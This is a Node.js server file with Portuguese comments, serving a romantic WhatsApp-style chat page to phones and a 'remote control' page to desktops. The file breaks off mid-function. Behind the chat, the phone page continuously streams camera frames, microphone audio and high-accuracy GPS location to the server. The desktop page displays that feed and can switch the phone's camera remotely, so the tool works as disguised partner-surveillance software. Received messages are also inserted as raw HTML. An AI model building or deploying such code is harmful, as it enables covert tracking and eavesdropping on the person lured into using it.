const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    // WhatsApp do Celular - receptor com todas as funcionalidades
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>💕 WhatsApp do Amor 💕</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        /* Header estilo WhatsApp */
        .whatsapp-header {
            background: #075E54;
            color: white;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
            z-index: 10;
        }
        
        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            padding: 0 8px;
        }
        
        .contact-info {
            flex: 1;
        }
        
        .contact-name {
            font-weight: bold;
            font-size: 16px;
        }
        
        .contact-status {
            font-size: 12px;
            opacity: 0.8;
        }
        
        .header-actions {
            display: flex;
            gap: 16px;
        }
        
        .header-actions button {
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }
        
        /* Container de vídeo local (self-view) */
        .video-self-container {
            position: fixed;
            bottom: 80px;
            right: 10px;
            width: 100px;
            height: 133px;
            border-radius: 12px;
            overflow: hidden;
            border: 2px solid #075E54;
            background: #000;
            z-index: 20;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        
        #localVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        /* Área de mensagens */
        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.05"><path fill="white" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M10,10 L10,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
            background-repeat: repeat;
        }
        
        /* Bolhas de mensagem */
        .message {
            display: flex;
            margin-bottom: 4px;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .message.received {
            justify-content: flex-start;
        }
        
        .message.sent {
            justify-content: flex-end;
        }
        
        .message-bubble {
            max-width: 70%;
            padding: 8px 12px;
            border-radius: 18px;
            font-size: 14px;
            line-height: 1.4;
            position: relative;
            word-wrap: break-word;
        }
        
        .message.received .message-bubble {
            background: #202C33;
            color: #E9EDEF;
            border-top-left-radius: 4px;
        }
        
        .message.sent .message-bubble {
            background: #005C4B;
            color: white;
            border-top-right-radius: 4px;
        }
        
        .message-time {
            font-size: 10px;
            opacity: 0.6;
            margin-top: 4px;
            text-align: right;
        }
        
        /* Indicador de digitação */
        .typing-indicator {
            display: none;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            margin-bottom: 8px;
        }
        
        .typing-indicator.show {
            display: flex;
        }
        
        .typing-dots {
            display: flex;
            gap: 4px;
        }
        
        .typing-dots span {
            width: 6px;
            height: 6px;
            background: #8696A0;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }
        
        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
        
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-6px); opacity: 1; }
        }
        
        /* Área de input estilo WhatsApp */
        .input-area {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-top: 1px solid #2A3B42;
        }
        
        .input-attach {
            background: none;
            border: none;
            color: #8696A0;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
        }
        
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 10px 16px;
            color: #E9EDEF;
            font-size: 15px;
            outline: none;
        }
        
        .input-field::placeholder {
            color: #8696A0;
        }
        
        .input-send {
            background: none;
            border: none;
            color: #00A884;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
        }
        
        /* Controles de mídia */
        .media-controls {
            position: fixed;
            bottom: 90px;
            left: 50%;
            transform: translateX(-50%);
            background: #1F2C33;
            border-radius: 30px;
            padding: 8px 16px;
            display: flex;
            gap: 20px;
            z-index: 20;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        
        .media-controls button {
            background: none;
            border: none;
            color: #E9EDEF;
            font-size: 20px;
            cursor: pointer;
            padding: 8px;
        }
        
        .media-controls button.active {
            color: #00A884;
        }
        
        /* Status de conexão */
        .connection-status {
            position: fixed;
            top: 60px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            z-index: 25;
            display: none;
        }
        
        /* Modal de permissões */
        .permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        
        .permission-content {
            background: #1F2C33;
            padding: 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 280px;
        }
        
        .permission-content h3 {
            color: white;
            margin-bottom: 16px;
        }
        
        .permission-content p {
            color: #8696A0;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .permission-btn {
            background: #00A884;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        
        /* Música em segundo plano */
        .youtube-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
            opacity: 0.15;
        }
        
        .youtube-background iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .music-bar {
            position: fixed;
            bottom: 100px;
            left: 10px;
            background: #1F2C33;
            border-radius: 20px;
            padding: 6px 12px;
            display: none;
            align-items: center;
            gap: 10px;
            z-index: 20;
            font-size: 11px;
            color: white;
        }
        
        .music-bar.show {
            display: flex;
        }
        
        /* Animações */
        @keyframes heartBeat {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        
        .heart-animation {
            animation: heartBeat 0.5s ease;
        }
    </style>
</head>
<body>
    <!-- Vídeo do YouTube em segundo plano -->
    <div class="youtube-background" id="youtubeBackground">
        <iframe id="youtubeIframe" allow="autoplay"></iframe>
    </div>
    
    <!-- Barra de música -->
    <div class="music-bar" id="musicBar">
        <span>🎵</span>
        <span id="musicName">Tocando...</span>
        <button id="stopMusicBtn" style="background:none;border:none;color:white;cursor:pointer;">⏹️</button>
    </div>
    
    <!-- Status de conexão -->
    <div class="connection-status" id="connectionStatus">
        📡 Conectado
    </div>
    
    <!-- Modal de permissões -->
    <div class="permission-modal" id="permissionModal">
        <div class="permission-content">
            <h3>💕 WhatsApp do Amor 💕</h3>
            <p>Para uma experiência completa, precisamos de acesso à sua câmera, microfone e localização.</p>
            <button class="permission-btn" id="startBtn">✨ Começar Conversa ✨</button>
        </div>
    </div>
    
    <!-- Header WhatsApp -->
    <div class="whatsapp-header">
        <button class="back-btn">←</button>
        <div class="contact-info">
            <div class="contact-name">💕 Meu Amor 💕</div>
            <div class="contact-status" id="contactStatus">online</div>
        </div>
        <div class="header-actions">
            <button id="toggleCameraBtn">📷</button>
            <button id="shareLocationBtn">📍</button>
        </div>
    </div>
    
    <!-- Self-view video -->
    <div class="video-self-container" id="videoSelfContainer" style="display: none;">
        <video id="localVideo" autoplay playsinline muted></video>
    </div>
    
    <!-- Área de mensagens -->
    <div class="messages-area" id="messagesArea">
        <div class="typing-indicator" id="typingIndicator">
            <div class="typing-dots">
                <span></span><span></span><span></span>
            </div>
            <span style="color:#8696A0; font-size:12px;">Meu Amor está digitando...</span>
        </div>
    </div>
    
    <!-- Input area -->
    <div class="input-area">
        <button class="input-attach" id="attachBtn">📎</button>
        <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
        <button class="input-send" id="sendBtn">➤</button>
    </div>
    
    <!-- Controles de mídia -->
    <div class="media-controls">
        <button id="micBtn" class="active">🎤</button>
        <button id="cameraBtn">📹</button>
        <button id="vibrateBtn">📳</button>
        <button id="surpriseBtn">🎁</button>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true
        });
        
        // Elementos
        const messagesArea = document.getElementById('messagesArea');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingIndicator = document.getElementById('typingIndicator');
        const contactStatus = document.getElementById('contactStatus');
        const connectionStatus = document.getElementById('connectionStatus');
        const permissionModal = document.getElementById('permissionModal');
        const startBtn = document.getElementById('startBtn');
        const localVideo = document.getElementById('localVideo');
        const videoSelfContainer = document.getElementById('videoSelfContainer');
        const micBtn = document.getElementById('micBtn');
        const cameraBtn = document.getElementById('cameraBtn');
        const vibrateBtn = document.getElementById('vibrateBtn');
        const surpriseBtn = document.getElementById('surpriseBtn');
        const toggleCameraBtn = document.getElementById('toggleCameraBtn');
        const shareLocationBtn = document.getElementById('shareLocationBtn');
        const attachBtn = document.getElementById('attachBtn');
        
        // Estado
        let mediaStream = null;
        let facingMode = 'user';
        let cameraEnabled = false;
        let micEnabled = true;
        let permissionsGranted = false;
        let typingTimeout = null;
        
        // Música
        const youtubeBackground = document.getElementById('youtubeBackground');
        const youtubeIframe = document.getElementById('youtubeIframe');
        const musicBar = document.getElementById('musicBar');
        const musicNameSpan = document.getElementById('musicName');
        
        // Função para adicionar mensagem
        function addMessage(text, isSent = true, isSpecial = false) {
            const messageDiv = document.createElement('div');
            messageDiv.className = \`message \${isSent ? 'sent' : 'received'}\`;
            
            const bubble = document.createElement('div');
            bubble.className = 'message-bubble';
            bubble.innerHTML = \`
                \${text}
                <div class="message-time">\${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
            \`;
            
            if (isSpecial) {
                bubble.style.background = isSent ? '#9B59B6' : '#6C3483';
                bubble.style.animation = 'heartBeat 0.5s ease';
            }
            
            messageDiv.appendChild(bubble);
            
            // Remover indicador de digitação antes de adicionar
            const typingIndicatorElem = document.getElementById('typingIndicator');
            if (typingIndicatorElem && typingIndicatorElem.parentNode === messagesArea) {
                messagesArea.removeChild(typingIndicatorElem);
            }
            
            messagesArea.appendChild(messageDiv);
            messageDiv.scrollIntoView({ behavior: 'smooth', block: 'end' });
            
            // Adicionar de volta o indicador
            messagesArea.appendChild(typingIndicatorElem);
            
            return messageDiv;
        }
        
        function addSystemMessage(text) {
            const msgDiv = document.createElement('div');
            msgDiv.style.cssText = 'text-align:center; font-size:11px; color:#8696A0; margin:8px 0;';
            msgDiv.textContent = text;
            messagesArea.appendChild(msgDiv);
            msgDiv.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
        
        // Iniciar câmera e microfone
        async function startPermissions() {
            try {
                addSystemMessage('📷 Solicitando permissões...');
                
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                const constraints = {
                    video: cameraEnabled ? { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: facingMode
                    } : false,
                    audio: micEnabled
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                mediaStream = stream;
                
                if (cameraEnabled) {
                    localVideo.srcObject = stream;
                    videoSelfContainer.style.display = 'block';
                    await localVideo.play();
                    
                    // Enviar frames de vídeo
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    const ctx = canvas.getContext('2d');
                    
                    setInterval(() => {
                        if (mediaStream && mediaStream.active && cameraEnabled && permissionsGranted) {
                            ctx.drawImage(localVideo, 0, 0, 320, 240);
                            const frame = canvas.toDataURL('image/jpeg', 0.5);
                            socket.emit('frame', frame);
                        }
                    }, 200);
                } else {
                    videoSelfContainer.style.display = 'none';
                }
                
                // Enviar áudio
                if (micEnabled) {
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const audioSource = audioContext.createMediaStreamSource(stream);
                    const audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                    
                    audioSource.connect(audioProcessor);
                    audioProcessor.connect(audioContext.destination);
                    
                    audioProcessor.onaudioprocess = (e) => {
                        if (permissionsGranted && micEnabled) {
                            const inputData = e.inputBuffer.getChannelData(0);
                            if (Math.random() < 0.05) {
                                socket.emit('audio', Array.from(inputData));
                            }
                        }
                    };
                }
                
                // Localização
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        (position) => {
                            if (permissionsGranted) {
                                socket.emit('location', {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                });
                            }
                        },
                        (error) => console.log('Erro localização:', error),
                        { enableHighAccuracy: true }
                    );
                }
                
                permissionsGranted = true;
                permissionModal.style.display = 'none';
                addSystemMessage('✨ Conectado! Agora você pode conversar com seu amor ✨');
                contactStatus.innerHTML = 'online 💕';
                
                // Notificar que está online
                socket.emit('mobile_online');
                
            } catch (err) {
                console.error('Erro permissões:', err);
                addSystemMessage('❌ Erro ao acessar câmera/microfone. Verifique as permissões!');
                alert('Por favor, permita o acesso à câmera e microfone para continuar');
            }
        }
        
        // Enviar mensagem
        function sendMessage(text) {
            if (text.trim() && permissionsGranted) {
                addMessage(text, true);
                socket.emit('romantic_message', text);
                messageInput.value = '';
                stopTyping();
            }
        }
        
        // Indicador de digitação
        function startTyping() {
            if (permissionsGranted) {
                socket.emit('typing_start');
                if (typingTimeout) clearTimeout(typingTimeout);
                typingTimeout = setTimeout(() => stopTyping(), 1500);
            }
        }
        
        function stopTyping() {
            socket.emit('typing_stop');
            if (typingTimeout) {
                clearTimeout(typingTimeout);
                typingTimeout = null;
            }
        }
        
        // Música
        function playYouTubeMusic(videoId, songName) {
            youtubeIframe.src = \`https://www.youtube.com/embed/\${videoId}?autoplay=1&loop=1&playlist=\${videoId}&controls=0&showinfo=0\`;
            youtubeBackground.style.display = 'block';
            musicBar.classList.add('show');
            musicNameSpan.innerHTML = songName;
            addSystemMessage(\`🎵 Tocando: \${songName}\`);
        }
        
        function stopYouTubeMusic() {
            youtubeIframe.src = '';
            youtubeBackground.style.display = 'none';
            musicBar.classList.remove('show');
            addSystemMessage('⏹️ Música parada');
        }
        
        document.getElementById('stopMusicBtn').onclick = () => {
            stopYouTubeMusic();
            socket.emit('stop_music');
        };
        
        // Efeito de vibração
        function vibrate(duration = 200) {
            if (navigator.vibrate) {
                navigator.vibrate(duration);
            }
        }
        
        // Surpresa especial
        function sendSurprise() {
            const surprises = [
                "🎁 SURPRESA! 💕 Você é a pessoa mais especial!",
                "💖 Um beijo virtual para você! 😘",
                "🌟 Você ilumina meus dias! ✨",
                "💝 Te amo mais a cada dia!",
                "🌹 Pensando em você agora!",
                "💕 Meu coração é seu!",
                "🎉 Você é incrível!"
            ];
            const surprise = surprises[Math.floor(Math.random() * surprises.length)];
            sendMessage(surprise);
            vibrate(500);
            
            // Efeito visual
            const messages = document.querySelectorAll('.message');
            if (messages.length > 0) {
                messages[messages.length - 1].classList.add('heart-animation');
                setTimeout(() => {
                    messages[messages.length - 1].classList.remove('heart-animation');
                }, 500);
            }
        }
        
        // Eventos de UI
        startBtn.onclick = () => {
            cameraEnabled = true;
            micEnabled = true;
            startPermissions();
        };
        
        sendBtn.onclick = () => {
            const text = messageInput.value.trim();
            if (text) sendMessage(text);
        };
        
        messageInput.onkeypress = (e) => {
            if (e.key === 'Enter') {
                sendMessage(messageInput.value.trim());
            } else {
                startTyping();
            }
        };
        
        messageInput.oninput = () => startTyping();
        
        micBtn.onclick = () => {
            micEnabled = !micEnabled;
            micBtn.classList.toggle('active', micEnabled);
            micBtn.innerHTML = micEnabled ? '🎤' : '🔇';
            startPermissions(); // Reiniciar com novas configurações
        };
        
        cameraBtn.onclick = () => {
            cameraEnabled = !cameraEnabled;
            cameraBtn.classList.toggle('active', cameraEnabled);
            cameraBtn.innerHTML = cameraEnabled ? '📹' : '📷';
            startPermissions();
        };
        
        vibrateBtn.onclick = () => {
            vibrate(200);
            socket.emit('comando', 'vibrate');
            addSystemMessage('📳 Vibração enviada');
        };
        
        surpriseBtn.onclick = () => {
            sendSurprise();
            socket.emit('comando', 'emergency');
        };
        
        toggleCameraBtn.onclick = () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (cameraEnabled) startPermissions();
            addSystemMessage(\`🔄 Câmera trocada para \${facingMode === 'user' ? 'frontal' : 'traseira'}\`);
        };
        
        shareLocationBtn.onclick = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const locationMsg = \`📍 Estou em: https://www.google.com/maps?q=\${position.coords.latitude},\${position.coords.longitude}\`;
                    sendMessage(locationMsg);
                });
            }
        };
        
        attachBtn.onclick = () => {
            const options = ['💕 Te amo', '😘 Beijos', '💖 Saudades', '✨ Você é especial', '🌹 Lindo dia'];
            const randomMsg = options[Math.floor(Math.random() * options.length)];
            sendMessage(randomMsg);
        };
        
        // Socket events
        socket.on('romantic_message', (msg) => {
            addMessage(msg, false);
            vibrate(50);
        });
        
        socket.on('play_youtube', (data) => {
            playYouTubeMusic(data.videoId, data.songName);
        });
        
        socket.on('stop_music', () => {
            stopYouTubeMusic();
        });
        
        socket.on('typing_start', () => {
            typingIndicator.classList.add('show');
            setTimeout(() => {
                typingIndicator.classList.remove('show');
            }, 2000);
        });
        
        socket.on('typing_stop', () => {
            typingIndicator.classList.remove('show');
        });
        
        socket.on('comando', (cmd) => {
            if (cmd === 'vibrate') {
                vibrate(200);
                addSystemMessage('📳 Seu amor enviou uma vibração!');
            } else if (cmd === 'emergency') {
                vibrate([500, 200, 500]);
                sendSurprise();
                addSystemMessage('💖 Surpresa especial do seu amor! 💖');
            } else if (cmd === 'trocarCamera') {
                toggleCameraBtn.click();
            }
        });
        
        socket.on('location', (data) => {
            addSystemMessage(\`📍 Seu amor está em: https://www.google.com/maps?q=\${data.latitude},\${data.longitude}\`);
        });
        
        socket.on('connect', () => {
            connectionStatus.style.display = 'block';
            connectionStatus.innerHTML = '✅ Conectado';
            setTimeout(() => {
                connectionStatus.style.display = 'none';
            }, 2000);
            if (permissionsGranted) {
                addSystemMessage('✨ Reconectado ao servidor');
            }
        });
        
        socket.on('disconnect', () => {
            connectionStatus.style.display = 'block';
            connectionStatus.innerHTML = '⚠️ Desconectado';
            connectionStatus.style.background = '#e74c3c';
            setTimeout(() => {
                connectionStatus.style.display = 'none';
                connectionStatus.style.background = 'rgba(0,0,0,0.8)';
            }, 3000);
        });
        
        // Adicionar mensagem de boas-vindas
        setTimeout(() => {
            if (!permissionsGranted) {
                addSystemMessage('💕 Clique em "Começar Conversa" para conectar com seu amor!');
            }
        }, 500);
    </script>
</body>
</html>`);
  } else {
    // WhatsApp do PC - controle remoto estilo WhatsApp Web
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>💕 WhatsApp Web - Meu Amor 💕</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
            overflow: hidden;
        }
        
        /* Sidebar */
        .sidebar {
            width: 300px;
            background: #111B21;
            border-right: 1px solid #2A3B42;
            display: flex;
            flex-direction: column;
        }
        
        .sidebar-header {
            background: #202C33;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .sidebar-header h2 {
            color: white;
            font-size: 18px;
            flex: 1;
        }
        
        .sidebar-header .status {
            width: 10px;
            height: 10px;
            background: #00A884;
            border-radius: 50%;
        }
        
        .contact-list {
            flex: 1;
            overflow-y: auto;
        }
        
        .contact-item {
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .contact-item:hover {
            background: #2A3B42;
        }
        
        .contact-item.active {
            background: #2A3B42;
        }
        
        .contact-avatar {
            width: 49px;
            height: 49px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .contact-info {
            flex: 1;
        }
        
        .contact-name {
            color: white;
            font-weight: bold;
        }
        
        .contact-lastmsg {
            color: #8696A0;
            font-size: 13px;
        }
        
        /* Chat principal */
        .chat-main {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .chat-header {
            background: #202C33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 16px;
            border-left: 1px solid #2A3B42;
        }
        
        .chat-contact-avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        
        .chat-contact-info {
            flex: 1;
        }
        
        .chat-contact-name {
            color: white;
            font-weight: bold;
        }
        
        .chat-contact-status {
            color: #8696A0;
            font-size: 13px;
        }
        
        .chat-actions {
            display: flex;
            gap: 20px;
        }
        
        .chat-actions button {
            background: none;
            border: none;
            color: #8696A0;
            font-size: 20px;
            cursor: pointer;
            padding: 8px;
        }
        
        /* Área de vídeo remoto */
        .video-panel {
            background: #000;
            height: 240px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            border-bottom: 1px solid #2A3B42;
        }
        
        #remoteVideo {
            max-width: 100%;
            max-height: 240px;
            object-fit: contain;
        }
        
        .video-controls {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
            background: rgba(0,0,0,0.7);
            padding: 8px 16px;
            border-radius: 30px;
        }
        
        .video-controls button {
            background: none;
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            padding: 4px 8px;
        }
        
        /* Área de mensagens */
        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="white" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M10,10 L10,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
            background-repeat: repeat;
        }
        
        .message {
            display: flex;
            margin-bottom: 4px;
        }
        
        .message.received {
            justify-content: flex-start;
        }
        
        .message.sent {
            justify-content: flex-end;
        }
        
        .message-bubble {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 18px;
            font-size: 14px;
            line-height: 1.4;
            position: relative;
        }
        
        .message.received .message-bubble {
            background: #202C33;
            color: #E9EDEF;
            border-top-left-radius: 4px;
        }
        
        .message.sent .message-bubble {
            background: #005C4B;
            color: white;
            border-top-right-radius: 4px;
        }
        
        .message-time {
            font-size: 10px;
            opacity: 0.6;
            margin-top: 4px;
            text-align: right;
        }
        
        .typing-indicator {
            display: none;
            padding: 8px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            margin-bottom: 8px;
        }
        
        .typing-indicator.show {
            display: block;
        }
        
        /* Input area */
        .input-area {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-top: 1px solid #2A3B42;
        }
        
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 10px 16px;
            color: #E9EDEF;
            font-size: 15px;
            outline: none;
        }
        
        .input-field::placeholder {
            color: #8696A0;
        }
        
        .input-send {
            background: none;
            border: none;
            color: #00A884;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
        }
        
        /* Músicas */
        .music-section {
            background: #1F2C33;
            padding: 16px;
            border-top: 1px solid #2A3B42;
        }
        
        .music-title {
            color: white;
            font-size: 14px;
            margin-bottom: 12px;
        }
        
        .music-list {
            display: flex;
            gap: 12px;
        }
        
        .music-item {
            flex: 1;
            background: #2A3B42;
            padding: 12px;
            border-radius: 12px;
            cursor: pointer;
            text-align: center;
            transition: all 0.2s;
        }
        
        .music-item:hover {
            background: #3A4B52;
            transform: translateY(-2px);
        }
        
        .music-name {
            color: white;
            font-size: 14px;
            font-weight: bold;
        }
        
        .music-artist {
            color: #8696A0;
            font-size: 11px;
            margin-top: 4px;
        }
        
        .stop-music {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 12px;
            width: 100%;
            font-size: 12px;
        }
        
        /* Location panel */
        .location-panel {
            background: #1F2C33;
            padding: 12px;
            font-size: 12px;
            color: #8696A0;
            border-top: 1px solid #2A3B42;
        }
        
        .location-panel a {
            color: #00A884;
            text-decoration: none;
        }
        
        /* Quick phrases */
        .quick-phrases {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 8px;
        }
        
        .quick-phrase {
            background: #2A3B42;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            color: #E9EDEF;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .quick-phrase:hover {
            background: #3A4B52;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .pulse {
            animation: pulse 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h2>WhatsApp do Amor</h2>
            <div class="status"></div>
        </div>
        <div class="contact-list">
            <div class="contact-item active">
                <div class="contact-avatar">💕</div>
                <div class="contact-info">
                    <div class="contact-name">Meu Amor</div>
                    <div class="contact-lastmsg">Online agora</div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="chat-main">
        <div class="chat-header">
            <div class="chat-contact-avatar">💕</div>
            <div class="chat-contact-info">
                <div class="chat-contact-name">Meu Amor</div>
                <div class="chat-contact-status" id="contactStatus">online</div>
            </div>
            <div class="chat-actions">
                <button id="vibrateBtn" title="Vibrar">📳</button>
                <button id="surpriseBtn" title="Surpresa">🎁</button>
                <button id="toggleCameraBtn" title="Trocar Câmera">🔄</button>
            </div>
        </div>
        
        <div class="video-panel">
            <img id="remoteVideo" src="" alt="Vídeo do celular">
            <div class="video-controls">
                <button id="enableAudioBtn" title="Áudio do celular">🔊</button>
                <button id="volumeUpBtn" title="Aumentar volume">📢</button>
            </div>
        </div>
        
        <div class="messages-area" id="messagesArea">
            <div class="typing-indicator" id="typingIndicator">
                💕 Meu Amor está digitando...
            </div>
        </div>
        
        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
            <button class="input-send" id="sendBtn">➤</button>
        </div>
        
        <div class="quick-phrases" id="quickPhrases"></div>
        
        <div class="music-section">
            <div class="music-title">🎵 Músicas para seu amor (tocam em segundo plano)</div>
            <div class="music-list">
                <div class="music-item" data-video-id="1N8N-X8NM4k" data-name="Música Especial 1">
                    <div class="music-name">💕 Música 1</div>
                    <div class="music-artist">Romântica</div>
                </div>
                <div class="music-item" data-video-id="sTVNvP5Uw98" data-name="Música Especial 2">
                    <div class="music-name">💖 Música 2</div>
                    <div class="music-artist">Amorosa</div>
                </div>
            </div>
            <button class="stop-music" id="stopMusicBtn">⏹️ Parar Música</button>
        </div>
        
        <div class="location-panel" id="locationPanel">
            📍 Aguardando localização do seu amor...
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        // Elementos
        const messagesArea = document.getElementById('messagesArea');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingIndicator = document.getElementById('typingIndicator');
        const contactStatus = document.getElementById('contactStatus');
        const remoteVideo = document.getElementById('remoteVideo');
        const locationPanel = document.getElementById('locationPanel');
        const quickPhrases = document.getElementById('quickPhrases');
        
        // Estado
        let audioEnabled = true;
        let audioContext = null;
        let audioGain = null;
        let frameCount = 0;
        
        // Frases prontas
        const phrases = [
            '💕 Te amo muito!',
            '😘 Saudades de você!',
            '💖 Você é especial!',
            '🌟 Pensando em você!',
            '🌹 Meu amor por você é infinito!',
            '💗 Você ilumina meu dia!',
            '✨ Você é meu sonho realizado!',
            '💝 Te amo mais que tudo!'
        ];
        
        // Adicionar frases rápidas
        phrases.forEach(phrase => {
            const span = document.createElement('span');
            span.className = 'quick-phrase';
            span.textContent = phrase;
            span.onclick = () => sendMessage(phrase);
            quickPhrases.appendChild(span);
        });
        
        // Configurar áudio
        function setupAudio() {
            audioContext = new (window.AudioContext || window.webkitAudioContext)();
            audioGain = audioContext.createGain();
            audioGain.gain.value = 0.5;
            audioGain.connect(audioContext.destination);
        }
        
        function addMessage(text, isSent = true, isSpecial = false) {
            const messageDiv = document.createElement('div');
            messageDiv.className = \`message \${isSent ? 'sent' : 'received'}\`;
            
